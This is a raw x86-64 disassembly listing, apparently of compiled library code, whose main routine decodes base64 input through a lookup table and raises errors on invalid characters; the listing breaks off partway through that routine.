    6d8c8ed2:	48 89 05 77 5d 10 00 	mov    %rax,0x105d77(%rip)        # 0x6d9cec50
    6d8c8ed9:	c3                   	ret
    6d8c8eda:	90                   	nop
    6d8c8edb:	90                   	nop
    6d8c8edc:	90                   	nop
    6d8c8edd:	90                   	nop
    6d8c8ede:	90                   	nop
    6d8c8edf:	90                   	nop
    6d8c8ee0:	56                   	push   %rsi
    6d8c8ee1:	53                   	push   %rbx
    6d8c8ee2:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c8ee6:	48 85 d2             	test   %rdx,%rdx
    6d8c8ee9:	48 89 ce             	mov    %rcx,%rsi
    6d8c8eec:	48 89 d3             	mov    %rdx,%rbx
    6d8c8eef:	74 05                	je     0x6d8c8ef6
    6d8c8ef1:	48 83 42 f0 08       	addq   $0x8,-0x10(%rdx)
    6d8c8ef6:	48 8b 0e             	mov    (%rsi),%rcx
    6d8c8ef9:	48 85 c9             	test   %rcx,%rcx
    6d8c8efc:	74 26                	je     0x6d8c8f24
    6d8c8efe:	48 8b 41 f0          	mov    -0x10(%rcx),%rax
    6d8c8f02:	48 8d 51 f0          	lea    -0x10(%rcx),%rdx
    6d8c8f06:	48 83 e8 08          	sub    $0x8,%rax
    6d8c8f0a:	48 83 f8 07          	cmp    $0x7,%rax
    6d8c8f0e:	48 89 41 f0          	mov    %rax,-0x10(%rcx)
    6d8c8f12:	77 10                	ja     0x6d8c8f24
    6d8c8f14:	48 8b 0d 75 f9 0e 00 	mov    0xef975(%rip),%rcx        # 0x6d9b8890
    6d8c8f1b:	48 83 c1 18          	add    $0x18,%rcx
    6d8c8f1f:	e8 47 9e ff ff       	call   0x6d8c2d6b
    6d8c8f24:	48 89 1e             	mov    %rbx,(%rsi)
    6d8c8f27:	48 83 c4 28          	add    $0x28,%rsp
    6d8c8f2b:	5b                   	pop    %rbx
    6d8c8f2c:	5e                   	pop    %rsi
    6d8c8f2d:	c3                   	ret
    6d8c8f2e:	57                   	push   %rdi
    6d8c8f2f:	56                   	push   %rsi
    6d8c8f30:	48 8b 3a             	mov    (%rdx),%rdi
    6d8c8f33:	48 8d 72 10          	lea    0x10(%rdx),%rsi
    6d8c8f37:	48 89 c8             	mov    %rcx,%rax
    6d8c8f3a:	48 8b 09             	mov    (%rcx),%rcx
    6d8c8f3d:	4c 8d 44 08 10       	lea    0x10(%rax,%rcx,1),%r8
    6d8c8f42:	48 8d 4f 01          	lea    0x1(%rdi),%rcx
    6d8c8f46:	4c 89 c7             	mov    %r8,%rdi
    6d8c8f49:	f3 a4                	rep movsb (%rsi),(%rdi)
    6d8c8f4b:	48 8b 12             	mov    (%rdx),%rdx
    6d8c8f4e:	48 01 10             	add    %rdx,(%rax)
    6d8c8f51:	5e                   	pop    %rsi
    6d8c8f52:	5f                   	pop    %rdi
    6d8c8f53:	c3                   	ret
    6d8c8f54:	48 85 d2             	test   %rdx,%rdx
    6d8c8f57:	74 02                	je     0x6d8c8f5b
    6d8c8f59:	eb d3                	jmp    0x6d8c8f2e
    6d8c8f5b:	c3                   	ret
    6d8c8f5c:	41 b8 04 00 00 00    	mov    $0x4,%r8d
    6d8c8f62:	48 8d 04 49          	lea    (%rcx,%rcx,2),%rax
    6d8c8f66:	48 99                	cqto
    6d8c8f68:	49 f7 f8             	idiv   %r8
    6d8c8f6b:	48 83 c0 06          	add    $0x6,%rax
    6d8c8f6f:	c3                   	ret
    6d8c8f70:	41 57                	push   %r15
    6d8c8f72:	41 56                	push   %r14
    6d8c8f74:	41 55                	push   %r13
    6d8c8f76:	41 54                	push   %r12
    6d8c8f78:	55                   	push   %rbp
    6d8c8f79:	57                   	push   %rdi
    6d8c8f7a:	56                   	push   %rsi
    6d8c8f7b:	53                   	push   %rbx
    6d8c8f7c:	48 83 ec 78          	sub    $0x78,%rsp
    6d8c8f80:	48 85 c9             	test   %rcx,%rcx
    6d8c8f83:	48 89 cb             	mov    %rcx,%rbx
    6d8c8f86:	0f 84 1f 0c 00 00    	je     0x6d8c9bab
    6d8c8f8c:	48 8b 01             	mov    (%rcx),%rax
    6d8c8f8f:	48 85 c0             	test   %rax,%rax
    6d8c8f92:	0f 84 13 0c 00 00    	je     0x6d8c9bab
    6d8c8f98:	48 8d 04 40          	lea    (%rax,%rax,2),%rax
    6d8c8f9c:	b9 04 00 00 00       	mov    $0x4,%ecx
    6d8c8fa1:	48 99                	cqto
    6d8c8fa3:	48 f7 f9             	idiv   %rcx
    6d8c8fa6:	48 8d 50 06          	lea    0x6(%rax),%rdx
    6d8c8faa:	31 c9                	xor    %ecx,%ecx
    6d8c8fac:	e8 8b b1 ff ff       	call   0x6d8c413c
    6d8c8fb1:	48 b9 00 24 00 00 01 	movabs $0x2000000100002400,%rcx
    6d8c8fb8:	00 00 20 
    6d8c8fbb:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
    6d8c8fc0:	48 8b 03             	mov    (%rbx),%rax
    6d8c8fc3:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
    6d8c8fc8:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
    6d8c8fcd:	48 8d 50 ff          	lea    -0x1(%rax),%rdx
    6d8c8fd1:	8a 44 13 10          	mov    0x10(%rbx,%rdx,1),%al
    6d8c8fd5:	3c 3d                	cmp    $0x3d,%al
    6d8c8fd7:	77 0d                	ja     0x6d8c8fe6
    6d8c8fd9:	48 0f a3 c1          	bt     %rax,%rcx
    6d8c8fdd:	73 07                	jae    0x6d8c8fe6
    6d8c8fdf:	48 89 54 24 48       	mov    %rdx,0x48(%rsp)
    6d8c8fe4:	eb e2                	jmp    0x6d8c8fc8
    6d8c8fe6:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
    6d8c8feb:	45 31 f6             	xor    %r14d,%r14d
    6d8c8fee:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
    6d8c8ff5:	00 00 
    6d8c8ff7:	48 8d 3d 42 9c 00 00 	lea    0x9c42(%rip),%rdi        # 0x6d8d2c40
    6d8c8ffe:	48 83 e8 04          	sub    $0x4,%rax
    6d8c9002:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
    6d8c9007:	4c 3b 74 24 58       	cmp    0x58(%rsp),%r14
    6d8c900c:	7e 40                	jle    0x6d8c904e
    6d8c900e:	4c 89 f0             	mov    %r14,%rax
    6d8c9011:	48 2b 44 24 48       	sub    0x48(%rsp),%rax
    6d8c9016:	b9 04 00 00 00       	mov    $0x4,%ecx
    6d8c901b:	48 99                	cqto
    6d8c901d:	48 f7 f9             	idiv   %rcx
    6d8c9020:	48 89 d0             	mov    %rdx,%rax
    6d8c9023:	48 c1 f8 3f          	sar    $0x3f,%rax
    6d8c9027:	48 31 c2             	xor    %rax,%rdx
    6d8c902a:	48 29 c2             	sub    %rax,%rdx
    6d8c902d:	48 83 fa 02          	cmp    $0x2,%rdx
    6d8c9031:	0f 85 14 05 00 00    	jne    0x6d8c954b
    6d8c9037:	e9 1e 05 00 00       	jmp    0x6d8c955a
    6d8c903c:	be 09 00 40 00       	mov    $0x400009,%esi
    6d8c9041:	48 c1 e6 0a          	shl    $0xa,%rsi
    6d8c9045:	48 0f a3 c6          	bt     %rax,%rsi
    6d8c9049:	73 11                	jae    0x6d8c905c
    6d8c904b:	49 89 ee             	mov    %rbp,%r14
    6d8c904e:	42 0f b6 44 33 10    	movzbl 0x10(%rbx,%r14,1),%eax
    6d8c9054:	49 8d 6e 01          	lea    0x1(%r14),%rbp
    6d8c9058:	3c 20                	cmp    $0x20,%al
    6d8c905a:	76 e0                	jbe    0x6d8c903c
    6d8c905c:	8a 04 07             	mov    (%rdi,%rax,1),%al
    6d8c905f:	88 44 24 57          	mov    %al,0x57(%rsp)
    6d8c9063:	fe c0                	inc    %al
    6d8c9065:	0f 85 0d 01 00 00    	jne    0x6d8c9178
    6d8c906b:	48 8b 0d ce f6 0e 00 	mov    0xef6ce(%rip),%rcx        # 0x6d9b8740
    6d8c9072:	ba 30 00 00 00       	mov    $0x30,%edx
    6d8c9077:	e8 d9 ad ff ff       	call   0x6d8c3e55
    6d8c907c:	48 89 c6             	mov    %rax,%rsi
    6d8c907f:	48 8b 05 1a f7 0e 00 	mov    0xef71a(%rip),%rax        # 0x6d9b87a0
    6d8c9086:	48 89 06             	mov    %rax,(%rsi)
    6d8c9089:	48 8d 05 70 9a 00 00 	lea    0x9a70(%rip),%rax        # 0x6d8d2b00
    6d8c9090:	48 89 46 10          	mov    %rax,0x10(%rsi)
    6d8c9094:	42 0f b6 4c 33 10    	movzbl 0x10(%rbx,%r14,1),%ecx
    6d8c909a:	e8 41 84 ff ff       	call   0x6d8c14e0
    6d8c909f:	4c 89 f1             	mov    %r14,%rcx
    6d8c90a2:	49 89 c4             	mov    %rax,%r12
    6d8c90a5:	e8 36 84 ff ff       	call   0x6d8c14e0
    6d8c90aa:	31 d2                	xor    %edx,%edx
    6d8c90ac:	4d 85 e4             	test   %r12,%r12
    6d8c90af:	49 89 c5             	mov    %rax,%r13
    6d8c90b2:	74 04                	je     0x6d8c90b8
    6d8c90b4:	49 8b 14 24          	mov    (%r12),%rdx
    6d8c90b8:	31 c0                	xor    %eax,%eax
    6d8c90ba:	4d 85 ed             	test   %r13,%r13
    6d8c90bd:	74 04                	je     0x6d8c90c3
    6d8c90bf:	49 8b 45 00          	mov    0x0(%r13),%rax
    6d8c90c3:	48 8d 4c 02 38       	lea    0x38(%rdx,%rax,1),%rcx
    6d8c90c8:	e8 87 ae ff ff       	call   0x6d8c3f54
    6d8c90cd:	48 8d 15 2c 9b 00 00 	lea    0x9b2c(%rip),%rdx        # 0x6d8d2c00
    6d8c90d4:	48 89 c1             	mov    %rax,%rcx
    6d8c90d7:	49 89 c1             	mov    %rax,%r9
    6d8c90da:	e8 4f fe ff ff       	call   0x6d8c8f2e
    6d8c90df:	42 8a 54 33 10       	mov    0x10(%rbx,%r14,1),%dl
    6d8c90e4:	49 8b 01             	mov    (%r9),%rax
    6d8c90e7:	4c 89 c9             	mov    %r9,%rcx
    6d8c90ea:	41 88 54 01 10       	mov    %dl,0x10(%r9,%rax,1)
    6d8c90ef:	48 8d 15 ea 9a 00 00 	lea    0x9aea(%rip),%rdx        # 0x6d8d2be0
    6d8c90f6:	41 c6 44 01 11 00    	movb   $0x0,0x11(%r9,%rax,1)
    6d8c90fc:	48 ff c0             	inc    %rax
    6d8c90ff:	49 89 01             	mov    %rax,(%r9)
    6d8c9102:	e8 27 fe ff ff       	call   0x6d8c8f2e
    6d8c9107:	4c 89 e2             	mov    %r12,%rdx
    6d8c910a:	4c 89 c9             	mov    %r9,%rcx
    6d8c910d:	e8 42 fe ff ff       	call   0x6d8c8f54
    6d8c9112:	48 8d 15 a7 9a 00 00 	lea    0x9aa7(%rip),%rdx        # 0x6d8d2bc0
    6d8c9119:	4c 89 c9             	mov    %r9,%rcx
    6d8c911c:	e8 0d fe ff ff       	call   0x6d8c8f2e
    6d8c9121:	4c 89 ea             	mov    %r13,%rdx
    6d8c9124:	4c 89 c9             	mov    %r9,%rcx
    6d8c9127:	e8 28 fe ff ff       	call   0x6d8c8f54
    6d8c912c:	48 8d 15 6d 9a 00 00 	lea    0x9a6d(%rip),%rdx        # 0x6d8d2ba0
    6d8c9133:	4c 89 c9             	mov    %r9,%rcx
    6d8c9136:	e8 f3 fd ff ff       	call   0x6d8c8f2e
    6d8c913b:	48 8d 4e 18          	lea    0x18(%rsi),%rcx
    6d8c913f:	4c 89 ca             	mov    %r9,%rdx
    6d8c9142:	e8 99 fd ff ff       	call   0x6d8c8ee0
    6d8c9147:	48 8d 4e 08          	lea    0x8(%rsi),%rcx
    6d8c914b:	31 d2                	xor    %edx,%edx
    6d8c914d:	e8 8e fd ff ff       	call   0x6d8c8ee0
    6d8c9152:	4c 8d 0d b2 99 00 00 	lea    0x99b2(%rip),%r9        # 0x6d8d2b0b
    6d8c9159:	48 89 f1             	mov    %rsi,%rcx
    6d8c915c:	48 c7 44 24 20 e9 00 	movq   $0xe9,0x20(%rsp)
    6d8c9163:	00 00 
    6d8c9165:	4c 8d 05 aa 99 00 00 	lea    0x99aa(%rip),%r8        # 0x6d8d2b16
    6d8c916c:	48 8d 15 8d 99 00 00 	lea    0x998d(%rip),%rdx        # 0x6d8d2b00
    6d8c9173:	e8 7f b5 ff ff       	call   0x6d8c46f7
    6d8c9178:	0f b6 44 2b 10       	movzbl 0x10(%rbx,%rbp,1),%eax
    6d8c917d:	0f b6 04 07          	movzbl (%rdi,%rax,1),%eax
    6d8c9181:	88 44 24 56          	mov    %al,0x56(%rsp)
    6d8c9185:	80 7c 24 56 ff       	cmpb   $0xff,0x56(%rsp)
    6d8c918a:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
    6d8c918f:	0f 85 0b 01 00 00    	jne    0x6d8c92a0
    6d8c9195:	48 8b 0d a4 f5 0e 00 	mov    0xef5a4(%rip),%rcx        # 0x6d9b8740
    6d8c919c:	ba 30 00 00 00       	mov    $0x30,%edx
    6d8c91a1:	e8 af ac ff ff       	call   0x6d8c3e55
    6d8c91a6:	48 89 c6             	mov    %rax,%rsi
    6d8c91a9:	48 8b 05 f0 f5 0e 00 	mov    0xef5f0(%rip),%rax        # 0x6d9b87a0
    6d8c91b0:	48 89 06             	mov    %rax,(%rsi)
    6d8c91b3:	48 8d 05 46 99 00 00 	lea    0x9946(%rip),%rax        # 0x6d8d2b00
    6d8c91ba:	48 89 46 10          	mov    %rax,0x10(%rsi)
    6d8c91be:	0f b6 4c 2b 10       	movzbl 0x10(%rbx,%rbp,1),%ecx
    6d8c91c3:	e8 18 83 ff ff       	call   0x6d8c14e0
    6d8c91c8:	48 89 e9             	mov    %rbp,%rcx
    6d8c91cb:	49 89 c4             	mov    %rax,%r12
    6d8c91ce:	e8 0d 83 ff ff       	call   0x6d8c14e0
    6d8c91d3:	31 d2                	xor    %edx,%edx
    6d8c91d5:	4d 85 e4             	test   %r12,%r12
    6d8c91d8:	49 89 c5             	mov    %rax,%r13
    6d8c91db:	74 04                	je     0x6d8c91e1
    6d8c91dd:	49 8b 14 24          	mov    (%r12),%rdx
    6d8c91e1:	31 c0                	xor    %eax,%eax
    6d8c91e3:	4d 85 ed             	test   %r13,%r13
    6d8c91e6:	74 04                	je     0x6d8c91ec
    6d8c91e8:	49 8b 45 00          	mov    0x0(%r13),%rax
    6d8c91ec:	48 8d 4c 02 38       	lea    0x38(%rdx,%rax,1),%rcx
    6d8c91f1:	e8 5e ad ff ff       	call   0x6d8c3f54
    6d8c91f6:	48 8d 15 03 9a 00 00 	lea    0x9a03(%rip),%rdx        # 0x6d8d2c00
    6d8c91fd:	48 89 c1             	mov    %rax,%rcx
    6d8c9200:	49 89 c1             	mov    %rax,%r9
    6d8c9203:	e8 26 fd ff ff       	call   0x6d8c8f2e
    6d8c9208:	8a 54 2b 10          	mov    0x10(%rbx,%rbp,1),%dl
    6d8c920c:	49 8b 01             	mov    (%r9),%rax
    6d8c920f:	4c 89 c9             	mov    %r9,%rcx
    6d8c9212:	41 88 54 01 10       	mov    %dl,0x10(%r9,%rax,1)
    6d8c9217:	48 8d 15 c2 99 00 00 	lea    0x99c2(%rip),%rdx        # 0x6d8d2be0
    6d8c921e:	41 c6 44 01 11 00    	movb   $0x0,0x11(%r9,%rax,1)
    6d8c9224:	48 ff c0             	inc    %rax
    6d8c9227:	49 89 01             	mov    %rax,(%r9)
    6d8c922a:	e8 ff fc ff ff       	call   0x6d8c8f2e
    6d8c922f:	4c 89 e2             	mov    %r12,%rdx
    6d8c9232:	4c 89 c9             	mov    %r9,%rcx
    6d8c9235:	e8 1a fd ff ff       	call   0x6d8c8f54
    6d8c923a:	48 8d 15 7f 99 00 00 	lea    0x997f(%rip),%rdx        # 0x6d8d2bc0
    6d8c9241:	4c 89 c9             	mov    %r9,%rcx
    6d8c9244:	e8 e5 fc ff ff       	call   0x6d8c8f2e
    6d8c9249:	4c 89 ea             	mov    %r13,%rdx
    6d8c924c:	4c 89 c9             	mov    %r9,%rcx
    6d8c924f:	e8 00 fd ff ff       	call   0x6d8c8f54
    6d8c9254:	48 8d 15 45 99 00 00 	lea    0x9945(%rip),%rdx        # 0x6d8d2ba0
    6d8c925b:	4c 89 c9             	mov    %r9,%rcx
    6d8c925e:	e8 cb fc ff ff       	call   0x6d8c8f2e
    6d8c9263:	48 8d 4e 18          	lea    0x18(%rsi),%rcx
    6d8c9267:	4c 89 ca             	mov    %r9,%rdx
    6d8c926a:	e8 71 fc ff ff       	call   0x6d8c8ee0
    6d8c926f:	48 8d 4e 08          	lea    0x8(%rsi),%rcx
    6d8c9273:	31 d2                	xor    %edx,%edx
    6d8c9275:	e8 66 fc ff ff       	call   0x6d8c8ee0
    6d8c927a:	4c 8d 0d 8a 98 00 00 	lea    0x988a(%rip),%r9        # 0x6d8d2b0b
    6d8c9281:	48 89 f1             	mov    %rsi,%rcx
    6d8c9284:	48 c7 44 24 20 e9 00 	movq   $0xe9,0x20(%rsp)
    6d8c928b:	00 00 
    6d8c928d:	4c 8d 05 82 98 00 00 	lea    0x9882(%rip),%r8        # 0x6d8d2b16
    6d8c9294:	48 8d 15 65 98 00 00 	lea    0x9865(%rip),%rdx        # 0x6d8d2b00
    6d8c929b:	e8 57 b4 ff ff       	call   0x6d8c46f7
    6d8c92a0:	49 8d 6e 02          	lea    0x2(%r14),%rbp
    6d8c92a4:	0f b6 44 2b 10       	movzbl 0x10(%rbx,%rbp,1),%eax
    6d8c92a9:	0f b6 04 07          	movzbl (%rdi,%rax,1),%eax
    6d8c92ad:	3c ff                	cmp    $0xff,%al
    6d8c92af:	49 89 c7             	mov    %rax,%r15
    6d8c92b2:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
    6d8c92b7:	0f 85 0b 01 00 00    	jne    0x6d8c93c8
    6d8c92bd:	48 8b 0d 7c f4 0e 00 	mov    0xef47c(%rip),%rcx        # 0x6d9b8740
    6d8c92c4:	ba 30 00 00 00       	mov    $0x30,%edx
    6d8c92c9:	e8 87 ab ff ff       	call   0x6d8c3e55
    6d8c92ce:	48 89 c6             	mov    %rax,%rsi
    6d8c92d1:	48 8b 05 c8 f4 0e 00 	mov    0xef4c8(%rip),%rax        # 0x6d9b87a0
    6d8c92d8:	48 89 06             	mov    %rax,(%rsi)
    6d8c92db:	48 8d 05 1e 98 00 00 	lea    0x981e(%rip),%rax        # 0x6d8d2b00
    6d8c92e2:	48 89 46 10          	mov    %rax,0x10(%rsi)
    6d8c92e6:	0f b6 4c 2b 10       	movzbl 0x10(%rbx,%rbp,1),%ecx
    6d8c92eb:	e8 f0 81 ff ff       	call   0x6d8c14e0
    6d8c92f0:	48 89 e9             	mov    %rbp,%rcx
    6d8c92f3:	49 89 c4             	mov    %rax,%r12
    6d8c92f6:	e8 e5 81 ff ff       	call   0x6d8c14e0
    6d8c92fb:	31 d2                	xor    %edx,%edx
    6d8c92fd:	4d 85 e4             	test   %r12,%r12
    6d8c9300:	49 89 c5             	mov    %rax,%r13
    6d8c9303:	74 04                	je     0x6d8c9309
    6d8c9305:	49 8b 14 24          	mov    (%r12),%rdx
    6d8c9309:	31 c0                	xor    %eax,%eax
    6d8c930b:	4d 85 ed             	test   %r13,%r13
    6d8c930e:	74 04                	je     0x6d8c9314
    6d8c9310:	49 8b 45 00          	mov    0x0(%r13),%rax
    6d8c9314:	48 8d 4c 02 38       	lea    0x38(%rdx,%rax,1),%rcx
    6d8c9319:	e8 36 ac ff ff       	call   0x6d8c3f54
    6d8c931e:	48 8d 15 db 98 00 00 	lea    0x98db(%rip),%rdx        # 0x6d8d2c00
    6d8c9325:	48 89 c1             	mov    %rax,%rcx
    6d8c9328:	49 89 c1             	mov    %rax,%r9
    6d8c932b:	e8 fe fb ff ff       	call   0x6d8c8f2e
    6d8c9330:	8a 54 2b 10          	mov    0x10(%rbx,%rbp,1),%dl
    6d8c9334:	49 8b 01             	mov    (%r9),%rax
    6d8c9337:	4c 89 c9             	mov    %r9,%rcx
    6d8c933a:	41 88 54 01 10       	mov    %dl,0x10(%r9,%rax,1)
    6d8c933f:	48 8d 15 9a 98 00 00 	lea    0x989a(%rip),%rdx        # 0x6d8d2be0
    6d8c9346:	41 c6 44 01 11 00    	movb   $0x0,0x11(%r9,%rax,1)
    6d8c934c:	48 ff c0             	inc    %rax
    6d8c934f:	49 89 01             	mov    %rax,(%r9)
    6d8c9352:	e8 d7 fb ff ff       	call   0x6d8c8f2e
    6d8c9357:	4c 89 e2             	mov    %r12,%rdx
    6d8c935a:	4c 89 c9             	mov    %r9,%rcx
    6d8c935d:	e8 f2 fb ff ff       	call   0x6d8c8f54
    6d8c9362:	48 8d 15 57 98 00 00 	lea    0x9857(%rip),%rdx        # 0x6d8d2bc0
    6d8c9369:	4c 89 c9             	mov    %r9,%rcx
    6d8c936c:	e8 bd fb ff ff       	call   0x6d8c8f2e
    6d8c9371:	4c 89 ea             	mov    %r13,%rdx
    6d8c9374:	4c 89 c9             	mov    %r9,%rcx
    6d8c9377:	e8 d8 fb ff ff       	call   0x6d8c8f54
    6d8c937c:	48 8d 15 1d 98 00 00 	lea    0x981d(%rip),%rdx        # 0x6d8d2ba0
    6d8c9383:	4c 89 c9             	mov    %r9,%rcx
    6d8c9386:	e8 a3 fb ff ff       	call   0x6d8c8f2e
    6d8c938b:	48 8d 4e 18          	lea    0x18(%rsi),%rcx
    6d8c938f:	4c 89 ca             	mov    %r9,%rdx
    6d8c9392:	e8 49 fb ff ff       	call   0x6d8c8ee0
    6d8c9397:	48 8d 4e 08          	lea    0x8(%rsi),%rcx
    6d8c939b:	31 d2                	xor    %edx,%edx
    6d8c939d:	e8 3e fb ff ff       	call   0x6d8c8ee0
    6d8c93a2:	4c 8d 0d 62 97 00 00 	lea    0x9762(%rip),%r9        # 0x6d8d2b0b
    6d8c93a9:	48 89 f1             	mov    %rsi,%rcx
    6d8c93ac:	48 c7 44 24 20 e9 00 	movq   $0xe9,0x20(%rsp)
    6d8c93b3:	00 00 
    6d8c93b5:	4c 8d 05 5a 97 00 00 	lea    0x975a(%rip),%r8        # 0x6d8d2b16
    6d8c93bc:	48 8d 15 3d 97 00 00 	lea    0x973d(%rip),%rdx        # 0x6d8d2b00
    6d8c93c3:	e8 2f b3 ff ff       	call   0x6d8c46f7
    6d8c93c8:	49 8d 6e 03          	lea    0x3(%r14),%rbp
    6d8c93cc:	0f b6 44 2b 10       	movzbl 0x10(%rbx,%rbp,1),%eax
    6d8c93d1:	44 8a 2c 07          	mov    (%rdi,%rax,1),%r13b
    6d8c93d5:	41 80 fd ff          	cmp    $0xff,%r13b
    6d8c93d9:	0f 85 14 01 00 00    	jne    0x6d8c94f3
    6d8c93df:	48 8b 0d 5a f3 0e 00 	mov    0xef35a(%rip),%rcx        # 0x6d9b8740
    6d8c93e6:	ba 30 00 00 00       	mov    $0x30,%edx
    6d8c93eb:	e8 65 aa ff ff       	call   0x6d8c3e55
    6d8c93f0:	48 89 c6             	mov    %rax,%rsi
    6d8c93f3:	48 8b 05 a6 f3 0e 00 	mov    0xef3a6(%rip),%rax        # 0x6d9b87a0
    6d8c93fa:	48 89 06             	mov    %rax,(%rsi)
    6d8c93fd:	48 8d 05 fc 96 00 00 	lea    0x96fc(%rip),%rax        # 0x6d8d2b00
    6d8c9404:	48 89 46 10          	mov    %rax,0x10(%rsi)
    6d8c9408:	0f b6 4c 2b 10       	movzbl 0x10(%rbx,%rbp,1),%ecx
    6d8c940d:	e8 ce 80 ff ff       	call   0x6d8c14e0
    6d8c9412:	48 89 e9             	mov    %rbp,%rcx
    6d8c9415:	49 89 c4             	mov    %rax,%r12
    6d8c9418:	e8 c3 80 ff ff       	call   0x6d8c14e0
    6d8c941d:	31 d2                	xor    %edx,%edx
    6d8c941f:	4d 85 e4             	test   %r12,%r12
    6d8c9422:	49 89 c0             	mov    %rax,%r8
    6d8c9425:	74 04                	je     0x6d8c942b
    6d8c9427:	49 8b 14 24          	mov    (%r12),%rdx
    6d8c942b:	31 c0                	xor    %eax,%eax
    6d8c942d:	4d 85 c0             	test   %r8,%r8
    6d8c9430:	74 03                	je     0x6d8c9435
    6d8c9432:	49 8b 00             	mov    (%r8),%rax
    6d8c9435:	48 8d 4c 02 38       	lea    0x38(%rdx,%rax,1),%rcx
    6d8c943a:	4c 89 44 24 68       	mov    %r8,0x68(%rsp)
    6d8c943f:	e8 10 ab ff ff       	call   0x6d8c3f54
    6d8c9444:	48 8d 15 b5 97 00 00 	lea    0x97b5(%rip),%rdx        # 0x6d8d2c00
    6d8c944b:	48 89 c1             	mov    %rax,%rcx
    6d8c944e:	49 89 c1             	mov    %rax,%r9
    6d8c9451:	e8 d8 fa ff ff       	call   0x6d8c8f2e
    6d8c9456:	8a 54 2b 10          	mov    0x10(%rbx,%rbp,1),%dl
    6d8c945a:	49 8b 01             	mov    (%r9),%rax
    6d8c945d:	4c 89 c9             	mov    %r9,%rcx
    6d8c9460:	41 88 54 01 10       	mov    %dl,0x10(%r9,%rax,1)
    6d8c9465:	48 8d 15 74 97 00 00 	lea    0x9774(%rip),%rdx        # 0x6d8d2be0
    6d8c946c:	41 c6 44 01 11 00    	movb   $0x0,0x11(%r9,%rax,1)
    6d8c9472:	48 ff c0             	inc    %rax
    6d8c9475:	49 89 01             	mov    %rax,(%r9)
    6d8c9478:	e8 b1 fa ff ff       	call   0x6d8c8f2e
    6d8c947d:	4c 89 e2             	mov    %r12,%rdx
    6d8c9480:	4c 89 c9             	mov    %r9,%rcx
    6d8c9483:	e8 cc fa ff ff       	call   0x6d8c8f54
    6d8c9488:	48 8d 15 31 97 00 00 	lea    0x9731(%rip),%rdx        # 0x6d8d2bc0
    6d8c948f:	4c 89 c9             	mov    %r9,%rcx
    6d8c9492:	e8 97 fa ff ff       	call   0x6d8c8f2e
    6d8c9497:	4c 8b 44 24 68       	mov    0x68(%rsp),%r8
    6d8c949c:	4c 89 c9             	mov    %r9,%rcx
    6d8c949f:	4c 89 c2             	mov    %r8,%rdx
    6d8c94a2:	e8 ad fa ff ff       	call   0x6d8c8f54
    6d8c94a7:	48 8d 15 f2 96 00 00 	lea    0x96f2(%rip),%rdx        # 0x6d8d2ba0
    6d8c94ae:	4c 89 c9             	mov    %r9,%rcx
    6d8c94b1:	e8 78 fa ff ff       	call   0x6d8c8f2e
    6d8c94b6:	48 8d 4e 18          	lea    0x18(%rsi),%rcx
    6d8c94ba:	4c 89 ca             	mov    %r9,%rdx
    6d8c94bd:	e8 1e fa ff ff       	call   0x6d8c8ee0
    6d8c94c2:	48 8d 4e 08          	lea    0x8(%rsi),%rcx
    6d8c94c6:	31 d2                	xor    %edx,%edx
    6d8c94c8:	e8 13 fa ff ff       	call   0x6d8c8ee0
    6d8c94cd:	4c 8d 0d 37 96 00 00 	lea    0x9637(%rip),%r9        # 0x6d8d2b0b
    6d8c94d4:	48 89 f1             	mov    %rsi,%rcx
    6d8c94d7:	48 c7 44 24 20 e9 00 	movq   $0xe9,0x20(%rsp)
    6d8c94de:	00 00 
    6d8c94e0:	4c 8d 05 2f 96 00 00 	lea    0x962f(%rip),%r8        # 0x6d8d2b16
    6d8c94e7:	48 8d 15 12 96 00 00 	lea    0x9612(%rip),%rdx        # 0x6d8d2b00
    6d8c94ee:	e8 04 b2 ff ff       	call   0x6d8c46f7
    6d8c94f3:	8a 44 24 57          	mov    0x57(%rsp),%al
    6d8c94f7:	49 83 c6 04          	add    $0x4,%r14
    6d8c94fb:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
    6d8c9500:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
    6d8c9505:	c1 e0 02             	shl    $0x2,%eax
    6d8c9508:	48 c1 fa 04          	sar    $0x4,%rdx
    6d8c950c:	09 d0                	or     %edx,%eax
    6d8c950e:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
    6d8c9513:	88 44 16 10          	mov    %al,0x10(%rsi,%rdx,1)
    6d8c9517:	8a 44 24 56          	mov    0x56(%rsp),%al
    6d8c951b:	41 0f b6 d7          	movzbl %r15b,%edx
    6d8c951f:	41 c1 e7 06          	shl    $0x6,%r15d
    6d8c9523:	48 c1 fa 02          	sar    $0x2,%rdx
    6d8c9527:	45 09 fd             	or     %r15d,%r13d
    6d8c952a:	c1 e0 04             	shl    $0x4,%eax
    6d8c952d:	09 d0                	or     %edx,%eax
    6d8c952f:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
    6d8c9534:	48 83 44 24 38 03    	addq   $0x3,0x38(%rsp)
    6d8c953a:	88 44 16 11          	mov    %al,0x11(%rsi,%rdx,1)
    6d8c953e:	48 89 f0             	mov    %rsi,%rax
    6d8c9541:	44 88 6c 10 12       	mov    %r13b,0x12(%rax,%rdx,1)
    6d8c9546:	e9 bc fa ff ff       	jmp    0x6d8c9007
    6d8c954b:	48 83 fa 03          	cmp    $0x3,%rdx
    6d8c954f:	0f 85 37 06 00 00    	jne    0x6d8c9b8c
    6d8c9555:	e9 6e 02 00 00       	jmp    0x6d8c97c8
    6d8c955a:	42 0f b6 44 33 10    	movzbl 0x10(%rbx,%r14,1),%eax
    6d8c9560:	4c 8d 25 d9 96 00 00 	lea    0x96d9(%rip),%r12        # 0x6d8d2c40
    6d8c9567:	41 8a 34 04          	mov    (%r12,%rax,1),%sil
    6d8c956b:	40 80 fe ff          	cmp    $0xff,%sil
    6d8c956f:	0f 85 0d 01 00 00    	jne    0x6d8c9682
    6d8c9575:	48 8b 0d c4 f1 0e 00 	mov    0xef1c4(%rip),%rcx        # 0x6d9b8740
    6d8c957c:	ba 30 00 00 00       	mov    $0x30,%edx
    6d8c9581:	e8 cf a8 ff ff       	call   0x6d8c3e55
    6d8c9586:	48 89 c7             	mov    %rax,%rdi
